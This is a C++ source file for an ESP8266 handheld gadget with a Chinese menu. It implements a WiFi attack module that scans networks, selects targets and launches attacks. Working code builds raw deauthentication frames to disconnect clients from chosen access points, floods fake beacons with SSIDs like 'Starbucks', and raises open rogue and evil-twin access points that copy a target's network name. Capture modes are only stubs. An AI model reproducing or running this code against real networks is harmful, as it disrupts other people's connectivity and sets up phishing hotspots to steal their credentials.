#include "wifi_attack.h"
#include "../config.h"
#include "../core/display_mgr.h"
#include "../core/wifi_mgr.h"
#include "../core/button_mgr.h"
#include "../chinese_glyphs.h"
#include "../utils.h"
#include <ESP8266WiFi.h>
#include <math.h>

const char* WifiAttack::fakeSsidList[WF_ATK_SSID_LIST_LEN] = {
    "FreeWiFi", "Starbucks", "ATT", "Xfinity WiFi", "McDonalds",
    "Airport WiFi", "Hotel Guest", "Linksys", "NETGEAR", "TP-Link",
    "DIRECT-", "iPhone", "AndroidAP", "Home WiFi"
};

ModuleInterface* createWifiAttack() { return new WifiAttack(); }

const char* WifiAttack::getTitle() const {
    switch (substate) {
        case SUB_MENU:          return "WiFi攻击中心";
        case SUB_SCANNING:      return "扫描中";
        case SUB_SELECT_TARGET: return "选择目标";
        case SUB_SELECT_MODE:   return "攻击模式";
        case SUB_CONFIGURE:     return "配置参数";
        case SUB_CONFIRM:       return "确认攻击";
        case SUB_ATTACKING:     return atkTypeName(atkType);
        case SUB_DONE:          return "攻击完成";
        default: return "WiFi攻击中心";
    }
}

RefreshMode WifiAttack::getRefreshMode() const {
    return (substate == SUB_ATTACKING || substate == SUB_SCANNING)
           ? REFRESH_CONTINUOUS : REFRESH_ON_DEMAND;
}

const char* WifiAttack::atkTypeName(WifiAttackType t) {
    switch (t) {
        case WFA_DEAUTH:       return "解除认证";
        case WFA_BEACON_FLOOD: return "信标洪水";
        case WFA_PMKID:        return "PMKID捕获";
        case WFA_HANDSHAKE:    return "握手捕获";
        case WFA_ROGUE_AP:     return "伪基站";
        case WFA_KARMA:        return "Karma攻击";
        case WFA_EVIL_TWIN:    return "钓鱼热点";
        case WFA_DEV_TESTS:    return "设备测试";
        default: return "???";
    }
}

const char* WifiAttack::atkTypeLabel(WifiAttackType t) {
    // Short ASCII labels for tight list views
    switch (t) {
        case WFA_DEAUTH:       return "Deauth";
        case WFA_BEACON_FLOOD: return "BeaconFlood";
        case WFA_PMKID:        return "PMKID";
        case WFA_HANDSHAKE:    return "Handshake";
        case WFA_ROGUE_AP:     return "Rogue AP";
        case WFA_KARMA:        return "Karma";
        case WFA_EVIL_TWIN:    return "EvilTwin";
        case WFA_DEV_TESTS:    return "Dev Tests";
        default: return "???";
    }
}

// ============================================================
// Lifecycle
// ============================================================
void WifiAttack::init() {
    memset(targets, 0, sizeof(targets));
    memset(selBssid, 0, sizeof(selBssid));
    memset(selSsid, 0, sizeof(selSsid));
    memset(statusMsg, 0, sizeof(statusMsg));
    targetCount = 0; targetCursor = 0; targetScroll = 0;
    selChannel = 0; selRssi = 0;
    atkType = WFA_DEAUTH; menuCursor = 0;
    deauthCount = 0; beaconDurationSec = 30; devTestIndex = 0;
    configStep = 0;
    selectedMask = 0; selectedCount = 0; currentTargetIdx = 0;
    currentPps = 0; lastPpsTime = 0; lastPpsCount = 0;
    attacking = false; safetyConfirmed = false;
    substate = SUB_MENU;
    mScrollY = mScrollYTarget = 0;
    mSelY = mSelYTarget = 0;
    mSelW = mSelWTarget = 0;
    mAnimLastMs = 0;
}

void WifiAttack::enter() {
    substate = SUB_MENU;
    menuCursor = 0;
    safetyConfirmed = false;
    attacking = false;
    targetCount = 0; targetCursor = 0;
    selectedMask = 0; selectedCount = 0;
    selSsid[0] = '\0';
    mScrollY = mScrollYTarget = 0;
    mSelY = mSelYTarget = 0;
    mSelW = mSelWTarget = 0;
    mAnimLastMs = millis();
    displayMgr.setDirty();
}

void WifiAttack::exit() {
    if (attacking) stopAttack();
    wifiMgr.promiscuousRelease(getId());
}

// ============================================================
// Scan helpers
// ============================================================
void WifiAttack::startWifiScan() {
    substate = SUB_SCANNING;
    WiFi.scanNetworks(true, false);
    displayMgr.setDirty();
}

void WifiAttack::processScanResult() {
    int n = WiFi.scanComplete();
    if (n < 0) return;
    targetCount = (n > WF_ATK_MAX_TARGETS) ? WF_ATK_MAX_TARGETS : n;
    for (uint8_t i = 0; i < targetCount; i++) {
        strCopySafe(targets[i].ssid, WiFi.SSID(i).c_str(), sizeof(targets[i].ssid));
        uint8_t* b = WiFi.BSSID(i);
        memcpy(targets[i].bssid, b, 6);
        targets[i].channel = WiFi.channel(i);
        targets[i].rssi = WiFi.RSSI(i);
        targets[i].encType = WiFi.encryptionType(i);
    }
    WiFi.scanDelete();
    // Auto-select first target by default
    selectedMask = 0; selectedCount = 0;
    if (targetCount > 0) {
        selectedMask = 1;  // select first target
        selectedCount = 1;
        memcpy(selBssid, targets[0].bssid, 6);
        strCopySafe(selSsid, targets[0].ssid, sizeof(selSsid));
        selChannel = targets[0].channel;
        selRssi = targets[0].rssi;
    }
    targetCursor = 0;
    substate = SUB_SELECT_TARGET;
    displayMgr.setDirty();
}

void WifiAttack::recomputeMenuTargets() {
    const uint8_t n = 6;
    // Scroll: keep cursor visible among 3 rows
    if (menuCursor < 3) {
        mScrollYTarget = 0;
    } else if (menuCursor >= n - 1) {
        mScrollYTarget = (float)(n - 3) * MENU_ROW_HEIGHT;
    } else {
        mScrollYTarget = (float)(menuCursor - 1) * MENU_ROW_HEIGHT;
    }
    mSelYTarget = (float)menuCursor * MENU_ROW_HEIGHT - mScrollYTarget + MENU_TOP_PAD;
    mSelWTarget = 0; // will be set in draw
}

// ============================================================
// Update dispatch
// ============================================================
void WifiAttack::update() {
    if (substate == SUB_SCANNING) {
        int n = WiFi.scanComplete();
        if (n >= 0) processScanResult();
        return;
    }

    // Sub-menu animation
    if (substate == SUB_MENU) {
        uint32_t now = millis();
        float dt = (now - mAnimLastMs) / 1000.0f;
        mAnimLastMs = now;
        if (dt <= 0.0f || dt > 0.05f) dt = 0.05f;
        float t = 1.0f - expf(-8.0f * dt);
        mScrollY += (mScrollYTarget - mScrollY) * t;
        mSelY    += (mSelYTarget - mSelY) * t;
        mSelW    += (mSelWTarget - mSelW) * t;
        if (fabsf(mScrollYTarget - mScrollY) < 0.2f) mScrollY = mScrollYTarget;
        if (fabsf(mSelYTarget - mSelY) < 0.2f) mSelY = mSelYTarget;
        if (fabsf(mSelWTarget - mSelW) < 0.2f) mSelW = mSelWTarget;
        if (fabsf(mScrollYTarget - mScrollY) > 0.1f || fabsf(mSelYTarget - mSelY) > 0.1f || fabsf(mSelWTarget - mSelW) > 0.1f)
            displayMgr.setDirty();
    }

    if (!attacking) return;

    uint32_t now = millis();
    uint32_t elapsed = now - attackStart;
    uint32_t maxDur = (atkType == WFA_BEACON_FLOOD) ? SEC_BEACON_FLOOD_DUR : SEC_ATTACK_MAX_DURATION;
    remainingSec = (elapsed >= maxDur) ? 0 : (maxDur - elapsed) / 1000;

    // PPS calculation (update every 500ms)
    if (now - lastPpsTime >= 500) {
        currentPps = (uint16_t)((sentCount - lastPpsCount) * 1000UL / (now - lastPpsTime));
        lastPpsTime = now;
        lastPpsCount = sentCount;
    }

    switch (atkType) {
        case WFA_DEAUTH:       updateDeauth(); break;
        case WFA_BEACON_FLOOD: updateBeaconFlood(); break;
        case WFA_PMKID:        updatePmkid(); break;
        case WFA_HANDSHAKE:    updateHandshake(); break;
        case WFA_ROGUE_AP:     updateRogueAp(); break;
        case WFA_KARMA:        updateKarma(); break;
        case WFA_EVIL_TWIN:    updateEvilTwin(); break;
        case WFA_DEV_TESTS:    updateDevTests(); break;
        default: break;
    }

    if (elapsed >= maxDur) {
        stopAttack();
        substate = SUB_DONE;
    }
}

// ============================================================
// Button handling
// ============================================================
void WifiAttack::handleButton(ButtonEvent ev) {
    if (attacking && ev != BTN_NONE) {
        stopAttack();
        substate = SUB_DONE;
        displayMgr.setDirty();
        return;
    }

    switch (substate) {
        case SUB_MENU:
            if (ev == BTN_UP_SHORT && menuCursor > 0) { menuCursor--; recomputeMenuTargets(); }
            if (ev == BTN_DOWN_SHORT && menuCursor < 5) { menuCursor++; recomputeMenuTargets(); }
            if (ev == BTN_UP_REPEAT && menuCursor > 0) { menuCursor--; recomputeMenuTargets(); }
            if (ev == BTN_DOWN_REPEAT && menuCursor < 5) { menuCursor++; recomputeMenuTargets(); }
            if (ev == BTN_OK_SHORT) {
                switch (menuCursor) {
                    case 0: startWifiScan(); break;
                    case 1:
                        if (targetCount > 0) substate = SUB_SELECT_TARGET;
                        break;
                    case 2: substate = SUB_SELECT_MODE; break;
                    case 3: configStep = 0; substate = SUB_CONFIGURE; break;
                    case 4: substate = SUB_CONFIRM; safetyConfirmed = false; break;
                    case 5: atkType = WFA_DEV_TESTS; substate = SUB_CONFIGURE; configStep = 0; break;
                }
            }
            break;

        case SUB_SELECT_TARGET:
            if (ev == BTN_UP_SHORT && targetCursor > 0) targetCursor--;
            if (ev == BTN_DOWN_SHORT && targetCursor < targetCount - 1) targetCursor++;
            if (ev == BTN_OK_SHORT) {
                // Toggle selection
                uint32_t bit = 1UL << targetCursor;
                if (selectedMask & bit) {
                    selectedMask &= ~bit;
                    if (selectedCount > 0) selectedCount--;
                } else {
                    selectedMask |= bit;
                    selectedCount++;
                }
                // Update primary target if first selection
                if (selectedCount == 1) {
                    for (uint8_t i = 0; i < targetCount; i++) {
                        if (selectedMask & (1UL << i)) {
                            memcpy(selBssid, targets[i].bssid, 6);
                            strCopySafe(selSsid, targets[i].ssid, sizeof(selSsid));
                            selChannel = targets[i].channel;
                            selRssi = targets[i].rssi;
                            break;
                        }
                    }
                }
            }
            // Select all with double UP
            if (ev == BTN_UP_DOUBLE) {
                selectedMask = (1UL << targetCount) - 1;
                selectedCount = targetCount;
            }
            // Deselect all with double DOWN
            if (ev == BTN_DOWN_DOUBLE) {
                selectedMask = 0; selectedCount = 0;
            }
            // Scroll
            if (targetCursor < targetScroll) targetScroll = targetCursor;
            if (targetCursor >= targetScroll + 2) targetScroll = targetCursor - 1;
            break;

        case SUB_SELECT_MODE:
            if (ev == BTN_UP_SHORT && atkType > 0) atkType = (WifiAttackType)(atkType - 1);
            if (ev == BTN_DOWN_SHORT && atkType < WFA_DEV_TESTS) atkType = (WifiAttackType)(atkType + 1);
            if (ev == BTN_OK_SHORT) substate = SUB_MENU;
            break;

        case SUB_CONFIGURE:
            if (atkType == WFA_DEV_TESTS) {
                if (ev == BTN_UP_SHORT && devTestIndex > 0) devTestIndex--;
                if (ev == BTN_DOWN_SHORT && devTestIndex < 8) devTestIndex++;
            } else if (atkType == WFA_DEAUTH) {
                // 0=continuous, then step 5/10/25/50/100
                if (ev == BTN_UP_SHORT) {
                    if (deauthCount == 0) deauthCount = 5;
                    else if (deauthCount < 25) deauthCount += 5;
                    else if (deauthCount < 100) deauthCount += 25;
                }
                if (ev == BTN_DOWN_SHORT) {
                    if (deauthCount > 25) deauthCount -= 25;
                    else if (deauthCount > 5) deauthCount -= 5;
                    else deauthCount = 0;
                }
            } else if (atkType == WFA_BEACON_FLOOD) {
                if (ev == BTN_UP_SHORT && beaconDurationSec < 60) beaconDurationSec += 5;
                if (ev == BTN_DOWN_SHORT && beaconDurationSec > 5) beaconDurationSec -= 5;
            }
            if (ev == BTN_OK_SHORT) substate = SUB_MENU;
            break;

        case SUB_CONFIRM:
            if (ev == BTN_OK_SHORT && !safetyConfirmed) {
                safetyConfirmed = true;
            } else if (ev == BTN_OK_SHORT && safetyConfirmed) {
                launchAttack();
            }
            break;

        case SUB_DONE:
            if (ev == BTN_OK_SHORT) substate = SUB_MENU;
            break;

        default: break;
    }
    displayMgr.setDirty();
}

// ============================================================
// Launch / Stop
// ============================================================
void WifiAttack::launchAttack() {
    attacking = true;
    attackStart = millis();
    lastActionMs = 0;
    sentCount = 0;
    clientCount = 0;
    eapolState = 0;
    currentPps = 0; lastPpsTime = millis(); lastPpsCount = 0;
    currentTargetIdx = 0;
    memset(statusMsg, 0, sizeof(statusMsg));
    substate = SUB_ATTACKING;

    // Ensure at least one target selected for deauth
    if (atkType == WFA_DEAUTH && selectedCount == 0 && targetCount > 0) {
        selectedMask = 1;
        selectedCount = 1;
    }

    switch (atkType) {
        case WFA_DEAUTH:
        case WFA_BEACON_FLOOD:
        case WFA_PMKID:
        case WFA_HANDSHAKE:
        case WFA_KARMA:
            wifiMgr.promiscuousAcquire(getId());
            if (selChannel > 0) wifiMgr.setChannel(selChannel);
            break;
        case WFA_ROGUE_AP:
            wifiMgr.promiscuousRelease(getId());
            WiFi.mode(WIFI_AP);
            WiFi.softAP("FreeWiFi", nullptr, selChannel > 0 ? selChannel : 6);
            break;
        case WFA_EVIL_TWIN:
            wifiMgr.promiscuousRelease(getId());
            WiFi.mode(WIFI_AP);
            WiFi.softAP(selSsid[0] ? selSsid : "FreeWiFi", nullptr, selChannel > 0 ? selChannel : 6);
            break;
        default: break;
    }
    displayMgr.setDirty();
}

void WifiAttack::stopAttack() {
    attacking = false;
    switch (atkType) {
        case WFA_DEAUTH:
        case WFA_BEACON_FLOOD:
        case WFA_PMKID:
        case WFA_HANDSHAKE:
        case WFA_KARMA:
            wifiMgr.promiscuousRelease(getId());
            break;
        case WFA_ROGUE_AP:
        case WFA_EVIL_TWIN:
            WiFi.softAPdisconnect(true);
            wifiMgr.setStationMode();
            break;
        default: break;
    }
}

// ============================================================
// Per-attack update functions
// ============================================================
void WifiAttack::updateDeauth() {
    uint32_t now = millis();
    if (deauthCount > 0 && sentCount >= (uint32_t)deauthCount) return;
    if (now - lastActionMs < 10) return;
    lastActionMs = now;

    if (selectedCount == 0) return;

    // Find next selected target (round-robin)
    uint8_t startIdx = currentTargetIdx;
    do {
        currentTargetIdx = (currentTargetIdx + 1) % targetCount;
    } while (!(selectedMask & (1UL << currentTargetIdx)) && currentTargetIdx != startIdx);

    uint8_t* bssid = targets[currentTargetIdx].bssid;
    uint8_t ch = targets[currentTargetIdx].channel;

    // Switch channel if target on different channel
    if (ch > 0 && ch != selChannel) {
        wifiMgr.setChannel(ch);
    }

    // Send bidirectional deauth burst
    uint8_t pkt[26];
    for (int dir = 0; dir < 2; dir++) {
        memset(pkt, 0, 26);
        pkt[0] = 0xC0;
        pkt[1] = 0x00;
        if (dir == 0) {
            memcpy(pkt+4,  "\xFF\xFF\xFF\xFF\xFF\xFF", 6);  // DA = broadcast
            memcpy(pkt+10, bssid, 6);                        // SA = AP
        } else {
            memcpy(pkt+4,  bssid, 6);                        // DA = AP
            memcpy(pkt+10, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);  // SA = broadcast
        }
        memcpy(pkt+16, bssid, 6);
        pkt[22] = (sentCount & 0x0F) << 4;
        pkt[23] = (sentCount >> 4) & 0xFF;
        pkt[24] = 0x07;
        pkt[25] = 0x00;

        wifiMgr.sendRawPacket(pkt, 26);
        sentCount++;
    }
    displayMgr.setDirty();
}

void WifiAttack::updateBeaconFlood() {
    uint32_t now = millis();
    if (now - lastActionMs < 20) return;
    lastActionMs = now;

    uint8_t pkt[128];
    memset(pkt, 0, sizeof(pkt));
    pkt[0] = 0x80;  // beacon
    pkt[1] = 0x00;
    memcpy(pkt+4, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    // Random BSSID
    pkt[10] = (sentCount & 0xFF);
    pkt[11] = ((sentCount >> 8) & 0xFF);
    pkt[12] = ((sentCount >> 16) & 0xFF);
    pkt[13] = ((sentCount >> 24) & 0xFF);
    pkt[14] = 0xDE; pkt[15] = 0xAD;

    const char* ssid = fakeSsidList[sentCount % WF_ATK_SSID_LIST_LEN];
    uint8_t ssidLen = strlen(ssid);
    pkt[37] = 0x00;  // SSID IE
    pkt[38] = ssidLen;
    memcpy(pkt+39, ssid, ssidLen);

    wifiMgr.sendRawPacket(pkt, 39 + ssidLen);
    sentCount++;
    displayMgr.setDirty();
}

void WifiAttack::updatePmkid() {
    // Passive — packet callback handles capture, update just polls
    // In this simplified version, we just show "listening" status
    uint32_t now = millis();
    if (now - lastActionMs > 1000) {
        lastActionMs = now;
        displayMgr.setDirty();
    }
}

void WifiAttack::updateHandshake() {
    // Passive — packet callback handles EAPOL state tracking
    uint32_t now = millis();
    if (now - lastActionMs > 1000) {
        lastActionMs = now;
        displayMgr.setDirty();
    }
}

void WifiAttack::updateRogueAp() {
    // Count connected stations
    struct station_info* info = wifi_softap_get_station_info();
    uint32_t count = 0;
    struct station_info* p = info;
    while (p) { count++; p = STAILQ_NEXT(p, next); }
    wifi_softap_free_station_info();
    if (count != clientCount) {
        clientCount = count;
        displayMgr.setDirty();
    }
}

void WifiAttack::updateKarma() {
    static uint32_t lastProbeClear = 0;
    uint32_t now = millis();
    if (now - lastProbeClear > 10000) {
        lastProbeClear = now;
        displayMgr.setDirty();
    }
    if (now - lastActionMs > 1000) {
        lastActionMs = now;
        displayMgr.setDirty();
    }
}

void WifiAttack::updateEvilTwin() {
    struct station_info* info = wifi_softap_get_station_info();
    uint32_t count = 0;
    struct station_info* p = info;
    while (p) { count++; p = STAILQ_NEXT(p, next); }
    wifi_softap_free_station_info();
    if (count != clientCount) {
        clientCount = count;
        displayMgr.setDirty();
    }
}

void WifiAttack::updateDevTests() {
    uint32_t now = millis();
    if (now - lastActionMs > 2000) {
        lastActionMs = now;
        sentCount++;
        displayMgr.setDirty();
    }
}

// ============================================================
// Draw dispatch
// ============================================================
void WifiAttack::draw(U8G2& u8g2) {
    switch (substate) {
        case SUB_MENU:          drawMenu(u8g2); break;
        case SUB_SCANNING:      drawScanning(u8g2); break;
        case SUB_SELECT_TARGET: drawSelectTarget(u8g2); break;
        case SUB_SELECT_MODE:   drawSelectMode(u8g2); break;
        case SUB_CONFIGURE:     drawConfigure(u8g2); break;
        case SUB_CONFIRM:       drawConfirm(u8g2); break;
        case SUB_ATTACKING:     drawAttacking(u8g2); break;
        case SUB_DONE:          drawDone(u8g2); break;
    }
}

// ============================================================
// Draw — SUB_MENU
// ============================================================
void WifiAttack::drawMenu(U8G2& u8g2) {
    static const char* itemCN[6] = {
        "扫描目标",
        "选择目标",
        "攻击模式",
        "配置参数",
        "开始攻击",
        "设备测试",
    };

    // Dynamic suffixes for items 1 and 2
    char tgtSuffix[24] = "";
    if (selSsid[0]) {
        tgtSuffix[0] = ':';
        strCopySafe(tgtSuffix + 1, selSsid, 21);
    }
    char modeSuffix[20] = "";
    snprintf(modeSuffix, sizeof(modeSuffix), ":%s", atkTypeLabel(atkType));

    const int cnBaseOff = MENU_ROW_HEIGHT - 2;

    // 1. Draw items
    for (uint8_t i = 0; i < 6; i++) {
        int y = (int)(i * MENU_ROW_HEIGHT - mScrollY + MENU_TOP_PAD + cnBaseOff);
        if (y < -14 || y > OLED_HEIGHT + 16) continue;

        drawCN(u8g2, MENU_TEXT_X, y, itemCN[i]);

        // Dynamic suffix
        const char* suf = (i == 1) ? tgtSuffix : (i == 2) ? modeSuffix : nullptr;
        if (suf && suf[0]) {
            u8g2.setFont(FONT_MENU);
            u8g2.drawStr(MENU_TEXT_X + cnStrWidth(itemCN[i]) + 2, y - 2, suf);
        }
    }

    // 2. Scrollbar
    u8g2.drawVLine(MENU_SCROLLBAR_X + 1, 0, OLED_HEIGHT);
    float sbH = OLED_HEIGHT * 3.0f / 6.0f;
    float sbY = (OLED_HEIGHT - sbH) * menuCursor / 5.0f;
    u8g2.drawBox(MENU_SCROLLBAR_X, (int)sbY, MENU_SCROLLBAR_W, max(4, (int)sbH));

    // 3. XOR selection box
    int tw = cnStrWidth(itemCN[menuCursor]);
    if (menuCursor == 1 && tgtSuffix[0]) {
        u8g2.setFont(FONT_MENU);
        tw += 2 + u8g2.getStrWidth(tgtSuffix);
    } else if (menuCursor == 2 && modeSuffix[0]) {
        u8g2.setFont(FONT_MENU);
        tw += 2 + u8g2.getStrWidth(modeSuffix);
    }
    mSelWTarget = tw + MENU_SEL_PAD_X * 2;
    int bw = max(20, (int)mSelW);
    u8g2.setDrawColor(2);
    u8g2.drawRBox(MENU_TEXT_X - MENU_SEL_PAD_X, (int)mSelY, bw, MENU_ROW_HEIGHT - 1, MENU_SEL_RADIUS);
    u8g2.setDrawColor(1);

    // 4. Footer
    u8g2.setFont(FONT_SMALL);
    u8g2.drawStr(0, 63, "OK:enter  UP/DN");
}

// ============================================================
// Draw — SUB_SCANNING
// ============================================================
void WifiAttack::drawScanning(U8G2& u8g2) {
    drawCN(u8g2, 0, 12, "扫描中");
    u8g2.setFont(FONT_BODY);
    u8g2.drawStr(2, 35, "Scanning WiFi...");
    // Animated dots
    uint8_t dots = (millis() / 300) % 4;
    for (uint8_t i = 0; i < dots; i++)
        u8g2.drawStr(80 + i * 6, 35, ".");
}

// ============================================================
// Draw — SUB_SELECT_TARGET
// ============================================================
void WifiAttack::drawSelectTarget(U8G2& u8g2) {
    drawCN(u8g2, 0, 12, "选择目标");
    u8g2.drawHLine(0, 15, OLED_WIDTH);

    for (uint8_t i = 0; i < 2 && (targetScroll + i) < targetCount; i++) {
        uint8_t idx = targetScroll + i;
        uint8_t y = 30 + i * 15;
        bool isSelected = (selectedMask & (1UL << idx)) != 0;
        if (idx == targetCursor) {
            u8g2.drawBox(0, y - 11, OLED_WIDTH, 14);
            u8g2.setDrawColor(0);
            // Checkbox
            u8g2.setFont(FONT_DATA);
            u8g2.drawStr(1, y, isSelected ? "[*]" : "[ ]");
            char buf[18];
            strCopySafe(buf, targets[idx].ssid, 17);
            u8g2.drawStr(18, y, buf);
            u8g2.setDrawColor(1);
        } else {
            u8g2.setFont(FONT_DATA);
            u8g2.drawStr(1, y, isSelected ? "[*]" : "[ ]");
            char buf[18];
            strCopySafe(buf, targets[idx].ssid, 17);
            u8g2.drawStr(18, y, buf);
        }
    }
    u8g2.setFont(FONT_DATA);
    char foot[32];
    snprintf(foot, sizeof(foot), "Sel:%d/%d Dbl^:all", selectedCount, targetCount);
    u8g2.drawStr(0, 63, foot);
}

// ============================================================
// Draw — SUB_SELECT_MODE
// ============================================================
void WifiAttack::drawSelectMode(U8G2& u8g2) {
    drawCN(u8g2, 0, 12, "攻击模式");
    u8g2.drawHLine(0, 15, OLED_WIDTH);

    for (uint8_t i = 0; i < WFA_COUNT; i++) {
        uint8_t y = 20 + i * 6;
        if (i == atkType) {
            u8g2.drawBox(0, y - 4, OLED_WIDTH, 6);
            u8g2.setDrawColor(0);
        }
        u8g2.setFont(FONT_SMALL);
        u8g2.drawStr(4, y, atkTypeLabel((WifiAttackType)i));
        if (i == atkType) u8g2.setDrawColor(1);
    }
}

// ============================================================
// Draw — SUB_CONFIGURE
// ============================================================
void WifiAttack::drawConfigure(U8G2& u8g2) {
    drawCN(u8g2, 0, 12, "配置参数");

    u8g2.setFont(FONT_DATA);
    if (atkType == WFA_DEV_TESTS) {
        u8g2.drawStr(2, 30, "Dev Test Index:");
        char buf[8];
        snprintf(buf, sizeof(buf), "%d", devTestIndex);
        u8g2.drawStr(100, 30, buf);
    } else if (atkType == WFA_DEAUTH) {
        if (deauthCount == 0) {
            drawCN(u8g2, 2, 28, "连续");
            drawCN(u8g2, 2, 42, "无限制");
        } else {
            char buf[16];
            snprintf(buf, sizeof(buf), "Limit: %d pkts", deauthCount);
            u8g2.drawStr(2, 24, buf);
        }
        u8g2.setFont(FONT_SMALL);
        u8g2.drawStr(2, 52, "UP/DN: 0=cont,5-100");
    } else if (atkType == WFA_BEACON_FLOOD) {
        drawCN(u8g2, 2, 28, "持续时间");
        char buf[8];
        u8g2.setFont(FONT_DATA);
        snprintf(buf, sizeof(buf), ":%d", beaconDurationSec);
        u8g2.drawStr(2 + cnStrWidth("持续时间"), 30, buf);
        u8g2.setFont(FONT_SMALL);
        u8g2.drawStr(2, 44, "UP/DN +/-5s");
    } else {
        drawCN(u8g2, 2, 28, "无需配置");
    }
    u8g2.setFont(FONT_SMALL);
    u8g2.drawStr(0, 63, "OK:back");
}

// ============================================================
// Draw — SUB_CONFIRM
// ============================================================
void WifiAttack::drawConfirm(U8G2& u8g2) {
    drawCN(u8g2, 0, 12, "确认攻击");

    drawCN(u8g2, 2, 28, atkTypeName(atkType));

    if (selSsid[0]) {
        u8g2.setFont(FONT_DATA);
        char t[22]; strCopySafe(t, selSsid, 20);
        char buf[32];
        snprintf(buf, sizeof(buf), "Tgt: %s", t);
        u8g2.drawStr(2, 42, buf);
    }

    u8g2.setFont(FONT_DATA);
    if (safetyConfirmed) {
        drawCN(u8g2, 2, 56, "按确定开始");
    } else {
        u8g2.drawStr(2, 52, "OK to confirm");
    }
    u8g2.setFont(FONT_SMALL);
    u8g2.drawStr(0, 63, "OK:confirm");
}

// ============================================================
// Draw — SUB_ATTACKING
// ============================================================
void WifiAttack::drawAttacking(U8G2& u8g2) {
    drawCN(u8g2, 0, 12, atkTypeName(atkType));

    // Animated indicator
    uint8_t bar = (millis() / 100) % 8;
    u8g2.setFont(FONT_DATA);
    u8g2.drawStr(100, 9, ">");
    for (uint8_t i = 0; i < bar; i++) u8g2.drawStr(100 + (i+1)*3, 9, "=");

    char buf[48];
    switch (atkType) {
        case WFA_DEAUTH: {
            char t[24];
            snprintf(t, sizeof(t), "Tgts:%d ", selectedCount);
            u8g2.setFont(FONT_SMALL);
            uint8_t shown = 0;
            for (uint8_t i = 0; i < targetCount && shown < 2; i++) {
                if (selectedMask & (1UL << i)) {
                    uint8_t len = strlen(t);
                    char ss[8]; strCopySafe(ss, targets[i].ssid, 6);
                    snprintf(t + len, sizeof(t) - len, "%s ", ss);
                    shown++;
                }
            }
            u8g2.drawStr(2, 24, t);
            u8g2.setFont(FONT_DATA);
            snprintf(buf, sizeof(buf), "PPS:%u Sent:%lu", currentPps, sentCount);
            u8g2.drawStr(2, 36, buf);
            if (deauthCount > 0) {
                snprintf(buf, sizeof(buf), "Limit:%d", deauthCount);
                u8g2.drawStr(70, 36, buf);
            } else {
                u8g2.drawStr(70, 36, "CONT");
            }
            break;
        }
        case WFA_BEACON_FLOOD:
            snprintf(buf, sizeof(buf), "Beacons:%lu", sentCount);
            u8g2.drawStr(2, 30, buf);
            break;
        case WFA_PMKID:
            drawCN(u8g2, 2, 28, "PMKID捕获中");
            break;
        case WFA_HANDSHAKE:
            drawCN(u8g2, 2, 28, "握手捕获中");
            break;
        case WFA_ROGUE_AP:
            snprintf(buf, sizeof(buf), "Clients:%lu", clientCount);
            u8g2.drawStr(2, 30, buf);
            break;
        case WFA_EVIL_TWIN:
            snprintf(buf, sizeof(buf), "Clients:%lu", clientCount);
            u8g2.drawStr(2, 30, buf);
            break;
        case WFA_KARMA:
            drawCN(u8g2, 2, 28, "探针响应中");
            break;
        case WFA_DEV_TESTS:
            snprintf(buf, sizeof(buf), "Test %d running...", devTestIndex);
            u8g2.drawStr(2, 30, buf);
            break;
        default: break;
    }

    u8g2.setFont(FONT_DATA);
    snprintf(buf, sizeof(buf), "Time left:%lus", remainingSec);
    u8g2.drawStr(2, 45, buf);

    // Progress bar
    uint32_t maxDur = (atkType == WFA_BEACON_FLOOD) ? SEC_BEACON_FLOOD_DUR : SEC_ATTACK_MAX_DURATION;
    uint32_t elapsed = millis() - attackStart;
    uint8_t prog = elapsed * OLED_WIDTH / maxDur;
    if (prog > OLED_WIDTH) prog = OLED_WIDTH;
    u8g2.drawFrame(0, 52, OLED_WIDTH, 5);
    u8g2.drawBox(0, 52, prog, 5);

    u8g2.setFont(FONT_SMALL);
    drawCN(u8g2, 0, 63, "按任意键停止");
}

// ============================================================
// Draw — SUB_DONE
// ============================================================
void WifiAttack::drawDone(U8G2& u8g2) {
    drawCN(u8g2, 0, 12, "攻击完成");

    drawCN(u8g2, 2, 28, atkTypeName(atkType));

    u8g2.setFont(FONT_BODY);
    char buf[40];
    switch (atkType) {
        case WFA_DEAUTH:
            snprintf(buf, sizeof(buf), "Sent: %u packets", (unsigned int)sentCount);
            break;
        case WFA_BEACON_FLOOD:
            snprintf(buf, sizeof(buf), "Sent: %u beacons", (unsigned int)sentCount);
            break;
        case WFA_ROGUE_AP:
        case WFA_EVIL_TWIN:
            snprintf(buf, sizeof(buf), "Clients: %u", (unsigned int)clientCount);
            break;
        default:
            snprintf(buf, sizeof(buf), "Elapsed: %us", (unsigned int)(SEC_ATTACK_MAX_DURATION - remainingSec));
            break;
    }
    u8g2.drawStr(2, 42, buf);
    u8g2.setFont(FONT_SMALL);
    u8g2.drawStr(0, 63, "OK:back to menu");
}
